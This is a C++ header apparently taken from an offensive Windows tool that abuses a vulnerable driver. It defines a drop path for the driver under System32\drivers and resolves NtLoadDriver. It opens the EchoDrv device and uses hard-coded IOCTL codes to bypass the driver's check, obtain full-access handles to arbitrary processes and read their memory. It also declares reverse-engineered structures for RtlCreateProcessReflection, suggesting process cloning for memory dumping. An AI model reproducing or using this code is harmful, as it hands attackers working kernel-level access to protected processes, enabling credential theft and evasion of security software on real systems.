#pragma once
#include <Windows.h>
#include <cstdint>
#include <winternl.h>
#include <iostream>
#include "resource2.h"


#define DROP_PATH L"C:\\Windows\\System32\\drivers\\sys_int.sys"


struct k_param_readmem {
    HANDLE targetProcess;
    void* fromAddress;
    void* toAddress;
    size_t length;
    void* padding;
    uint32_t returnCode;
};

struct k_param_init {
    void* first;
    void* second;
    void* third;
};

struct k_get_handle {
    DWORD pid;
    ACCESS_MASK access;
    HANDLE handle;
};

// This is a windows type to fetch NtQuerySystemInformation
// These structures are copied from Process Hacker source code (ntldr.h)
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct _SYSTEM_HANDLE
{
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Crypt32.lib")

class DriverInterface {
public:
    HANDLE hDevice;

    // On instantiation, get a handle to the driver and execute our first IOCTL call.
    DriverInterface() {
        hDevice = CreateFileA(
            "\\\\.\\EchoDrv",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL
        );

        //If driver handle failed to open print message and return
        if (hDevice == INVALID_HANDLE_VALUE) {
            //std::cout << "Invalid handle on CreateFileA!" << std::endl;
            //Get the last error from windows for CreateFile
            //std::cout << "Error code: " << GetLastError() << std::endl;
        }

        // Yes, this buffer seems useless - but without it the driver BSOD's the PC.
        //Create a buffer to have data returned to.
        void* buf = (void*)malloc(4096);

        //Call IOCTL that sets the PID variable and gets past the DWORD check
        //0x9e6a0594 - IOCTL Code
        BOOL success = DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 4096, NULL, NULL);
        if (!success) {
            //std::cout << "DeviceIOControl 0x9e6a0594 failed!" << std::endl;
            //std::cout << "Error code: " << GetLastError() << std::endl;

            CloseHandle(hDevice);
            return;
        }

        //We don't need that buffer anymore
        free(buf);
    }

    ~DriverInterface() {
        CloseHandle(hDevice);
    }

    // Next, get a HANDLE to the desired process through the driver.
    HANDLE get_handle_for_pid(DWORD pid) {
        // IOCTL Code - 0xe6224248

        k_get_handle param{};
        // Process ID to get handle for
        param.pid = pid;

        // Access to be granted on the returned handle
        param.access = GENERIC_ALL;

        // Do DeviceIoControl call
        BOOL success = DeviceIoControl(hDevice, 0xe6224248, &param, sizeof(param), &param, sizeof(param), NULL, NULL);
        if (!success) {
            //std::cout << "DeviceIOControl 0xe6224248 failed!" << std::endl;
             //std::cout << "Error code: " << GetLastError() << std::endl;
            return INVALID_HANDLE_VALUE;
        }

        // Return the handle given by the driver.
        return param.handle;
    }

    // A simple function to read memory using the driver.
    BOOL read_memory_raw(void* address, void* buf, size_t len, HANDLE targetProcess) {
        k_param_readmem req{};
        req.fromAddress = (void*)address;
        req.length = len;
        req.targetProcess = targetProcess;
        req.toAddress = (void*)buf;

        BOOL success = DeviceIoControl(hDevice, 0x60a26124, &req, sizeof(k_param_readmem), &req, sizeof(k_param_readmem), NULL, NULL);
        return success;
    }

    void Shutdown() {
        CloseHandle(hDevice);
    }
};



typedef NTSTATUS(NTAPI* pNtLoadDriver) (
	_In_ PUNICODE_STRING DriverServiceName
	);

typedef void(NTAPI* pRtlInitUnicodeString) (
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

pNtLoadDriver NtLoadDriver = (pNtLoadDriver) GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtLoadDriver");


#define STATUS_SUCCESS 0x0
#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // don't update synchronization objects
#endif

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} T_CLIENT_ID;

typedef struct
{
    HANDLE ReflectionProcessHandle;
    HANDLE ReflectionThreadHandle;
    T_CLIENT_ID ReflectionClientId;
} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;


typedef NTSTATUS(NTAPI* RtlCreateProcessReflectionFunc) (
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation
    );

// IDA Data: the internal struct for RtlCreateProcessReflection. gets passed to RtlpProcessReflectionStartup
typedef struct {
    DWORD64 unk1;
    ULONG Flags;
    PVOID StartRoutine;
    PVOID StartContext;
    PVOID unk2;
    PVOID unk3;
    PVOID EventHandle;
} ReflectionContext;